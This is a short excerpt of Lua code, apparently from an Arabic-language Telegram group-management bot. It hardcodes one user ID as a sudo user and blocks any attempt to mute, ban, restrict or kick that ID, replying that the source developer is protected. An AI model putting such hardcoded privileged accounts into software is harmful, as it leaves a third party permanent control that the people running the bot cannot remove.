...
sudo_users = {SUDO,906158642,1330590972,1044506670,1463960994}   
...
var = true  
elseif tonumber(user_id) == tonumber(906158642) then
var = true 
...
if tonumber(result.sender_user_id_) == tonumber(906158642) then  
send(msg.chat_id_, msg.id_, "♪ لا تستطيع كتم او حظر او تقييد مطور السورس")
return false 
end
...
if tonumber(result.id_) == tonumber(906158642) then  
send(msg.chat_id_, msg.id_, "♪ لا تستطيع حظر او كتم او طرد مطور السورس")
return false 
end
...
if tonumber(userid) == tonumber(906158642) then  
send(msg.chat_id_, msg.id_, "♪ لا تستطيع كتم او حظر او تقييد مطور السورس")
return false 
end
